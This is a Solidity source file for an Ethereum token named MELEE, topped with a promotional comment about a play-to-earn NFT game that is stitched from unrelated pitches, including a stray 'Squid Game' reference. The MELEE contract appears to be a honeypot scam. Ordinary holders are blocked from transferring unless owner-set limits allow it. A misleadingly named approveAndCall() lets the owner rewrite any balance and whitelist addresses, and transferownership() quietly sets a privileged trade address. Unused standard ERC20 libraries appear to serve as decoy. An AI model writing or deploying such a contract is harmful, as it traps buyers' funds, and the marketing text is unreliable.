/*
Melee Game

IT’S DANGEROUS TO GAME ALONE - TAKE MELEE!

Looking for group (LFG)? Melee is the community-powered companion that fuels your fire for gaming. Discover and talk about the best in gaming, from gameplay highlights to news to humor -- all curated by gamers like you.
Melee Game is an online survival simulation game deployed on Ethereum chain, where users can play games to earn great prizes. Squid Game reserves the original survival gaming process and high economic incentives.

Join the Melee gaming community to connect with other gamers and discover clips, highlights, memes, and surrounding discussion.


GET INTO THE GAME
Watch clips and highlights from your favorite games and share your own amazing in-game moments.

You don’t need to be a superstar Twitch or YouTube streamer to reach other gamers on Melee. Upload your own game play videos to get started.


FEEL THE COMMUNITY POWER
Melee is powered by gamers. Your votes determine which content rises to the top and which games are most popular. Join the community to earn Melee XP and level up your gameplay, or just browse awhile and listen.

Crafting Game on Ethereum

Melee Game is a PVP, play-to-earn card board game, driven by a unique mint and craft mechanic, where players grow more powerful through gamified NFT alchemy. Elemental base cards are sold weekly, allowing only the most skilled alchemists to thrive and progress in this medieval metaverse. All NFT holders will receive ETHEREUM yield generated by the game ecosystem, rewarding the most loyal and skilled holders.

NFT & Token
Deflation System
Melee Game leverages a brand new type of NFT minting process that balances game design and scarcity, designed to produce a sustainable, long-term economy. Crafting Technology achieves this, in part, by burning base cards to craft higher-tier cards, combing scarcity with game theory. Additionally, when chests are opened with $MELEE, they are both burnt and used for vital liquidity--bolstering the entire game economy. The NFT’s total supply will be determined and balanced by community demand driven by free market principles.


Open Source
Crafting Technology
Melee Game leverages the ERC-1155 protocol and the Crafting System is rooted in the features available within this specification. This system can be utilized by any project, partner or artist to generate a sustainable NFT economy driven by actual demand, not arbitrary numbers.


Board Game
Melee Game’s play-to-earn board game mode allows players to go head-to-head, testing their skills and demonstrating the strength of their alchemy and crafted power. This is an engaging game experience, bringing the NFT crafting and economy to life in an all out medieval battle. A successful victor earns ETHEREUM rewards, generated by the game protocol.

《MELEE Land》
MELEE game UI，Based on the MELEE contract, you can summon heroes, assign points, go on an adventure, and upgrade levels.

《MELEE Dungeons》
MELEE Of Dungeons is the first exploration based on d20srd rules in the MELEE game ecosystem. Get more assets in adventure.

《Melee Game》
Melee Game is monster collections in MELEE ecosystem, 11000 in total, with attributes randomly created.
How are black hole contracts applied to project iterations?

With the emergence of projects, there will be situations where the old contracts are gradually not applicable to the new scenarios. Different from the traditional Internet system, the biggest derivation problem is how to transfer the assets in the old contract to the new contract.
A set of black hole contracts without management authority can be developed. Assets can only be entered but cannot be exported. Asset recovery is undertaken for the old contract, and the new contract is mapped at the same time, thereby completing the transfer of values and assets.
But there is a problem. The solution requires the user to initiate the initiative, and the old users who have not received the message cannot complete the work.
What the key requirements of smart contracts are
flexibility and scalability
When designing, it is necessary to split the value storage function and the business execution function. The iteration of the business contract does not affect the value and assets of the storage contract, which can effectively reduce the cost of iteration. And there is no need for users to actively do any work. As shown in the figure below: Xcontract is a business contract, AssetBox is a storage contract, and the iteration of X does not affect the data.


Upgrade Melee Game 1.0 to 2.0


What is Melee Game 1.0
The total amount of Melee Game 1.0 is 11,000.
Melee Game Instruction
Melee Gameis a kind of NFT asset randomly generated and stored on the blockchain with different names, careers, and…
medium.com

At first, we developed the Battle smart contract for Rarity. After realizing that there were no monsters in the game, we designed and developed the Melee Game. Then we have to optimize the Battle contract to fit in Melee Game. After all the back and forth, our goal is getting clear, an RPG game, DnD alike, but in monsters’ prospective.
Reasons for the upgrade
Two keys:
There are only 11.000 monsters in Melee Game 1.0, which is not conducive to the development of the game ecosystem. The so-called scarcity lays in demand, not in quantity. In order to promote the healthy development of the game and attract more players to participate in the game, and create a metaverse from the perspective of Monster, We decided not to limit the quantity.
There are lots of shortcomings in Melee Game 1.0 on the road of continuous exploration, such as, limited gameplay experience, character attributes mismatch due to unfamiliarity with DnD. We did experice the pleasure brought by the game after doing lots of homework (reading books, watching videos, and participating in games). We really want to bring this pleasure to more DnD players, which drives us to dedicate more to the game. This all starts from the upgrading.
What is Melee Game 2.0
Contracts fully based on DnD3.5E standard, which means normalized description of monsters, standardized character attributes, etc. The structure of contracts:

 

The Planning of Melee Game 2.0
Compared with 1.0, a more flexible architecture will be adopted, which will separate data, storage, and management. With this architecture, Apps is for minting, MonsterBox is for bookkeeping, and DAO is for management.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract MELEE {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}